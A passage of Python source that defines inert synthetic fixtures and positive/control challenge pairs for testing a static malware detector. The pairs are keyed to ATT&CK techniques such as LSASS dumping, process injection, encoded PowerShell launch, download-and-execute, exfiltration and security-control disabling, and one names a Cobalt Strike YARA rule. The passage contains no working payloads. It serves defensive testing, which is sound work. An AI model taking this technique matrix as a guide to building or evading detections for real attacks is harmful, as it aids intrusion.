            desired_literal_references=('phase5-native-buffer', 'resource:channel:primary'),
            desired_operation_kinds=('file_read', 'network_send', 'native_return'),
            forbidden_operation_kinds=('native_call', 'native_syscall'),
            desired_reachability=(
                _r('file_read', 'entrypoint_reachable', 1), _r('network_send', 'entrypoint_reachable', 1),
                _r('native_return', 'entrypoint_reachable', 1),
            ),
            desired_flow=(_f('file_read', 'network_send', False),), desired_technique_ids=(),
            desired_artifact_implementation_state='not_expected',
            generation_seed='stage2636.11020:2026-08-17:static-attack-matrix-v6:native_elf_no_value_flow',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='native_elf_x86_64', extension='.elf', member_extension='',
            language='native_x86_64', platform='Linux',
            source_text='Deterministic inert ELF with source and sink but disconnected value flow.\n',
            fixture_variant='no_value_flow',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='native_elf_wrong_sink',
            malware_class='control', coverage_cohort='adjacent_technique_control',
            desired_parser_status='complete',
            desired_literal_references=('phase5-native-buffer', 'resource:channel:primary'),
            desired_operation_kinds=('file_read', 'file_write', 'native_return'),
            forbidden_operation_kinds=('network_send', 'native_call', 'native_syscall'),
            desired_reachability=(
                _r('file_read', 'entrypoint_reachable', 1), _r('file_write', 'entrypoint_reachable', 1),
                _r('native_return', 'entrypoint_reachable', 1),
            ),
            desired_flow=(), desired_technique_ids=(),
            desired_artifact_implementation_state='not_expected',
            generation_seed='stage2636.11020:2026-08-17:static-attack-matrix-v6:native_elf_wrong_sink',
            unresolved_states=(),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='native_elf_x86_64', extension='.elf', member_extension='',
            language='native_x86_64', platform='Linux',
            source_text='Deterministic inert ELF with adjacent write sink instead of network send.\n',
            fixture_variant='wrong_sink',
        ),
    ),
    CorpusFixtureDefinition(
        generation_intent=CorpusGenerationIntent(
            generation_id='native_elf_unresolved_indirect',
            malware_class='control', coverage_cohort='unsupported_or_unavailable',
            desired_parser_status='partial',
            desired_literal_references=('phase5-native-buffer', 'resource:channel:primary'),
            desired_operation_kinds=('native_call', 'native_return'),
            forbidden_operation_kinds=('file_read', 'network_send'),
            desired_reachability=(
                _r('native_call', 'entrypoint_reachable', 1), _r('native_return', 'entrypoint_reachable', 1),
            ),
            desired_flow=(), desired_technique_ids=(),
            desired_artifact_implementation_state='unavailable',
            generation_seed='stage2636.11020:2026-08-17:static-attack-matrix-v6:native_elf_unresolved_indirect',
            unresolved_states=('unresolved_indirect_native_call',),
        ),
        renderer_specification=ArtifactRendererSpecification(
            renderer_kind='native_elf_x86_64', extension='.elf', member_extension='',
            language='native_x86_64', platform='Linux',
            source_text='Deterministic inert ELF with unresolved indirect control flow.\n',
            fixture_variant='unresolved_indirect',
        ),
    ),
)

SYNTHETIC_ATTACK_FIXTURES = _MALWARE_FIXTURES + _CONTROL_FIXTURES
MALWARE_SYNTHETIC_ATTACK_FIXTURES = _MALWARE_FIXTURES
CONTROL_SYNTHETIC_ATTACK_FIXTURES = _CONTROL_FIXTURES

_FIXTURE_BY_ID = {
    item.generation_intent.generation_id: item for item in SYNTHETIC_ATTACK_FIXTURES
}


def _pair(
    challenge_id: str,
    positive_generation_id: str,
    control_generation_id: str,
    *challenge_kinds: str,
    reviewed_yara_rule_name: str = "",
) -> SyntheticAttackChallengePairDefinition:
    return SyntheticAttackChallengePairDefinition(
        challenge_id=challenge_id,
        challenge_kinds=tuple(sorted(challenge_kinds)),
        positive_fixture=_FIXTURE_BY_ID[positive_generation_id],
        control_fixture=_FIXTURE_BY_ID[control_generation_id],
        reviewed_yara_rule_name=reviewed_yara_rule_name,
    )


SYNTHETIC_ATTACK_CHALLENGE_PAIRS = (
    _pair(
        "t1003_lsass_documentation",
        "python_lsass_dump", "python_lsass_documentation",
        "behavior_detectable_without_yara", "documentation_only",
        "strings_only_false_positive", "supported_static_behavior",
    ),
    _pair(
        "t1021_admin_share_documentation",
        "batch_remote_admin_service", "batch_admin_share_documentation",
        "behavior_detectable_without_yara", "documentation_only", "supported_static_behavior",
    ),
    _pair(
        "t1055_process_injection_documentation",
        "python_process_injection_sequence", "python_injection_documentation",
        "behavior_detectable_without_yara", "documentation_only",
        "strings_only_false_positive", "supported_static_behavior",
    ),
    _pair(
        "t1055_process_injection_dead_code",
        "python_process_injection_sequence", "python_injection_dead_code",
        "behavior_detectable_without_yara", "dead_code",
        "supported_static_behavior", "unreachable_behavior",
    ),
    _pair(
        "t1059_001_encoded_help",
        "python_encoded_powershell_launch", "powershell_encoded_help",
        "behavior_detectable_without_yara", "strings_only_false_positive",
        "supported_static_behavior",
    ),
    _pair(
        "t1105_download_documentation",
        "batch_download_file_execute", "batch_download_documentation",
        "behavior_detectable_without_yara", "documentation_only",
        "incomplete_operation_sequence", "supported_static_behavior",
    ),
    _pair(
        "t1059_001_t1105_combined_control",
        "powershell_download_encoded_launch", "powershell_encoded_help",
        "behavior_detectable_without_yara", "incomplete_operation_sequence",
        "supported_static_behavior",
    ),
    _pair(
        "t1059_unsupported_command_interpreter",
        "batch_generic_command_interpreter", "batch_command_interpreter_documentation",
        "behavior_detectable_without_yara", "documentation_only",
        "unsupported_physically_present_behavior",
    ),
    _pair(
        "t1041_unsupported_exfiltration",
        "batch_exfiltration_channel", "batch_exfiltration_documentation",
        "behavior_detectable_without_yara", "documentation_only",
        "unsupported_physically_present_behavior",
    ),
    _pair(
        "t1562_retired_security_control",
        "powershell_security_control_disable", "powershell_security_help",
        "behavior_detectable_without_yara", "documentation_only",
    ),
    _pair(
        "t1059_001_renpy_strings_control",
        "renpy_encoded_powershell_launch", "renpy_encoded_powershell_documentation",
        "behavior_detectable_without_yara", "strings_only_false_positive",
        "supported_static_behavior",
    ),
    _pair(
        "managed_behavior_documentation",
        "dotnet_managed_behavior", "dotnet_managed_documentation",
        "documentation_only", "supported_static_behavior",
    ),
    _pair(
        "native_imports_without_calls",
        "native_elf_import_flow_positive", "native_elf_symbols_no_calls",
        "incomplete_operation_sequence", "supported_static_behavior",
    ),
    _pair(
        "native_same_calls_unreachable",
        "native_elf_import_flow_positive", "native_elf_calls_unreachable",
        "dead_code", "supported_static_behavior", "unreachable_behavior",
    ),
    _pair(
        "native_wrong_target_resource",
        "native_elf_import_flow_positive", "native_elf_wrong_target_identity",
        "supported_static_behavior", "wrong_target_resource",
    ),
    _pair(
        "native_disconnected_value_flow",
        "native_elf_import_flow_positive", "native_elf_no_value_flow",
        "disconnected_flow", "supported_static_behavior",
    ),
    _pair(
        "native_wrong_sink",
        "native_elf_import_flow_positive", "native_elf_wrong_sink",
        "incomplete_operation_sequence", "supported_static_behavior",
    ),
    _pair(
        "native_unresolved_indirect",
        "native_elf_import_flow_positive", "native_elf_unresolved_indirect",
        "supported_static_behavior", "unresolved_dynamic_behavior",
    ),
    _pair(
        "t1059_001_reviewed_yara_corroboration",
        "powershell_yara_corroborated_encoded_launch", "powershell_yara_signature_only",
        "behavior_detectable_without_yara", "supported_static_behavior",
        "yara_corroborated_behavior", "yara_only_control",
        reviewed_yara_rule_name=(
            "GCTI_Cobaltstrike_Resources_Template_X64_Ps1_V3_0_To_V4_X_Excluding_3_12_3_13"
        ),
    ),
)

if any(item.generation_intent.malware_class != "malware" for item in _MALWARE_FIXTURES):
    raise RuntimeError("synthetic_attack_malware_fixture_class_invalid")
if any(item.generation_intent.malware_class != "control" for item in _CONTROL_FIXTURES):
    raise RuntimeError("synthetic_attack_control_fixture_class_invalid")
if len({item.generation_intent.generation_id for item in SYNTHETIC_ATTACK_FIXTURES}) != len(SYNTHETIC_ATTACK_FIXTURES):
    raise RuntimeError("synthetic_attack_fixture_identity_duplicate")
if len({item.challenge_id for item in SYNTHETIC_ATTACK_CHALLENGE_PAIRS}) != len(SYNTHETIC_ATTACK_CHALLENGE_PAIRS):
    raise RuntimeError("synthetic_attack_challenge_pair_identity_duplicate")

__all__ = (
    "CONTROL_SYNTHETIC_ATTACK_FIXTURES",
    "MALWARE_SYNTHETIC_ATTACK_FIXTURES",
    "SYNTHETIC_ATTACK_CHALLENGE_PAIRS",
    "SYNTHETIC_ATTACK_FIXTURES",
    "SYNTHETIC_ATTACK_TECHNIQUE_IDS",
)
